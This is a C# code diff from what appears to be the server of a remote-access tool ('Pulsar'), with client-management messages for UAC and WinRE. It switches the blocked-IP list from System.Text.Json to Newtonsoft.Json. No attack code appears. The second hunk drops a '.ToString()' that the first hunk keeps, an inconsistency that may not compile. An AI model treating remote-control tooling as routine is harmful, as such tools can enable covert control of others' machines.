@@ -23,11 +23,9 @@ using System.Threading;
 using System.Windows.Forms;
 using Pulsar.Common.Messages.QuickCommands;
 using System.IO;
-using System.Text.Json;
-using System.Drawing;
-using System.Xml;
-using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 using Newtonsoft.Json;
+using System.Drawing;
+using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 
 using Pulsar.Common.Messages.ClientManagement.UAC;
 using Pulsar.Common.Messages.ClientManagement.WinRE;
@@ -445,7 +443,7 @@ namespace Pulsar.Server.Forms
             try
             {
                 string json = File.ReadAllText(filePath);
-                var blockedIPs = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json);
+                var blockedIPs = JsonConvert.DeserializeObject<List<string>>(json);
                 return blockedIPs.Contains(clientAddress.ToString());
             }
             catch (Exception)
@@ -2055,13 +2053,13 @@ namespace Pulsar.Server.Forms
                         if (File.Exists(filePath))
                         {
                             string json = File.ReadAllText(filePath);
-                            blockedIPs = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json) ?? new List<string>();
+                            blockedIPs = JsonConvert.DeserializeObject<List<string>>(json) ?? new List<string>();
                         }
-                        if (!blockedIPs.Contains(clientAddress.ToString()))
+                        if (!blockedIPs.Contains(clientAddress))
                         {
-                            blockedIPs.Add(clientAddress.ToString());
+                            blockedIPs.Add(clientAddress);
                         }
-                        string updatedJson = System.Text.Json.JsonSerializer.Serialize(blockedIPs, new JsonSerializerOptions { WriteIndented = true });
+                        string updatedJson = JsonConvert.SerializeObject(blockedIPs, Newtonsoft.Json.Formatting.Indented);
                         File.WriteAllText(filePath, updatedJson);
                     }
                     catch (Exception)
